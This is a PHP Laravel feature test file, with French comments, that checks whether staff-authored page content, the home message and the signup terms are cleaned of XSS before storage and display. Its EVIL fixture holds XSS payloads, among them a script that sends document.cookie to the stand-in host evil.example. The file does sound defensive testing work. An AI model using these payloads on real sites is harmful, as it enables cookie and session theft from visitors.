<?php

namespace Tests\Feature;

use App\Models\Page;
use App\Services\SettingService;
use App\Support\Permission;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Tests\Support\CreatesStaff;
use Tests\TestCase;

/** Du HTML saisi par un membre du personnel ne doit jamais executer de script chez les visiteurs. */
class PublicHtmlSanitizingTest extends TestCase
{
    use CreatesStaff, RefreshDatabase;

    private const EVIL = '<p onclick="alert(1)">Bonjour</p><script>document.location="https://evil.example/?c="+document.cookie</script><img src=x onerror="alert(2)"><a href="javascript:alert(3)">lien</a>';

    /** Un fragment de contenu : aucune trace de l'attaque ni meme une balise script. */
    private function assertClean(string $html): void
    {
        foreach (['<script', 'onerror', 'onclick', 'javascript:', 'evil.example'] as $needle) {
            $this->assertStringNotContainsString($needle, $html);
        }
    }

    /** Une page entiere contient les scripts legitimes du site : on cherche seulement les marques de l'attaque. */
    private function assertPageClean(string $html): void
    {
        foreach (['alert(1)', 'alert(2)', 'alert(3)', 'evil.example', 'document.cookie'] as $needle) {
            $this->assertStringNotContainsString($needle, $html);
        }
    }

    public function test_a_page_saved_by_staff_is_cleaned_when_stored_and_when_displayed(): void
    {
        $staff = $this->staff([Permission::PAGES]);

        $this->actingAs($staff)->post(route('admin.pages.store'), ['title' => 'Règlement', 'slug' => 'reglement', 'content' => self::EVIL, 'is_enabled' => '1'])->assertRedirect(route('admin.pages.index'));

        $page = Page::where('slug', 'reglement')->sole();
        $this->assertClean($page->getRawOriginal('content'));
        $this->assertStringContainsString('Bonjour', $page->content);
        $response = $this->actingAs($this->student())->get(route('pages.show', 'reglement'))->assertOk()->assertSee('Bonjour')->assertSee('lien');
        $this->assertPageClean($response->getContent());
    }

    public function test_updating_a_page_cleans_the_new_content_too(): void
    {
        $page = Page::create(['title' => 'P', 'slug' => 'p', 'content' => '<p>ok</p>', 'is_enabled' => true]);

        $this->actingAs($this->staff([Permission::PAGES]))->put(route('admin.pages.update', $page), ['title' => 'P', 'slug' => 'p', 'content' => self::EVIL, 'is_enabled' => '1'])->assertRedirect();

        $this->assertClean($page->fresh()->getRawOriginal('content'));
    }

    public function test_content_stored_before_the_protection_is_cleaned_at_display_time(): void
    {
        DB::table('pages')->insert(['title' => 'Ancienne', 'slug' => 'ancienne', 'content' => self::EVIL, 'is_enabled' => true, 'is_restricted' => false, 'created_at' => now(), 'updated_at' => now()]);

        $body = $this->pageBody('ancienne');
        $this->assertPageClean($body);
        $this->assertStringContainsString('Bonjour', $body);
    }

    public function test_the_home_message_is_cleaned_when_saved_and_when_displayed(): void
    {
        $this->actingAs($this->admin())->post(route('admin.settings.home.update'), ['home_message' => self::EVIL])->assertSessionHasNoErrors();
        $this->assertClean(setting('home_message'));

        app(SettingService::class)->set('home_message', self::EVIL); // contenu ancien, enregistre sans nettoyage
        $page = $this->actingAs($this->student())->get(route('home'))->assertOk();

        $this->assertPageClean($page->getContent());
        $page->assertSee('Bonjour');
    }

    public function test_the_registration_terms_are_cleaned_on_the_public_signup_page(): void
    {
        $this->actingAs($this->admin())->post(route('admin.settings.auth.update'), $this->authSettings(['registration_terms' => self::EVIL]))->assertSessionHasNoErrors();
        $this->assertClean(setting('registration_terms'));

        app(SettingService::class)->set('registration_terms', self::EVIL);
        app(SettingService::class)->set('registration_open', '1');
        auth()->logout();

        $response = $this->get(route('register'));

        $this->assertPageClean($response->getContent());
        $response->assertSee('Bonjour');
    }

    public function test_user_controlled_text_elsewhere_is_still_escaped(): void
    {
        $pupil = $this->student();
        $pupil->forceFill(['name' => '<script>alert(1)</script>'])->save();
        \App\Models\UserNotification::create(['user_id' => $pupil->id, 'title' => '<b>x</b>', 'message' => '<script>y</script>', 'type' => 'info']);

        $page = $this->actingAs($pupil)->get(route('notifications.index'))->assertOk();

        $page->assertDontSee('<script>y</script>', false)->assertSee('&lt;script&gt;y&lt;/script&gt;', false)->assertSee('&lt;b&gt;x&lt;/b&gt;', false);
    }

    private function pageBody(string $slug): string
    {
        return $this->get(route('pages.show', $slug))->getContent();
    }

    private function authSettings(array $override): array
    {
        return $override + ['registration_open' => '1', 'registration_terms' => '', 'registration_message' => '', 'allowed_email_domains' => ''];
    }
}
